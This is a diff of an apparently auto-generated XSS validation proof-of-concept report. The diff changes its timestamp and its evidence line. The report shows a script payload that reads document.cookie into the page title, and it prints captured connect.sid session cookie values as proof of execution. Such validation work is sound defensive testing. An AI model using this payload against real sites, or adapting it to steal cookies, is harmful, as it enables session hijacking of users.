@@ -1,6 +1,6 @@
 # XSS Validation PoC — CONFIRMED
 
-**Generated:** 2026-10-27T02:31:28.804Z
+**Generated:** 2026-10-31T16:36:59.054Z
 
 ## Summary
 - **Validated (executed AND control clean):** YES
@@ -22,7 +22,7 @@ Payload:
 ```html
 <script>document.title='XSS-CONFIRMED-'+document.cookie</script>
 ```
-**Evidence — execution confirmed:** the page title became `XSS-CONFIRMED-connect.sid=s%3AXdwddLeSg9bi0Upxnkeql_JXY8kiEQdX.pKmC5MNJEpPKgwgErURkjsrimd2L8Za4bU%2B7qy1%2BKfw`.
+**Evidence — execution confirmed:** the page title became `XSS-CONFIRMED-connect.sid=s%3A6183oEp9Yzfaz1vcXgObsADyM0mYQFIb.7RTOOdC5H3vZFL5ZUGk15SZX3gJ2u47CByLC6NdLaPI`.
 The injected script ran (it set `document.title` and read `document.cookie`) — this is execution,
 not mere reflection. executed=YES
 
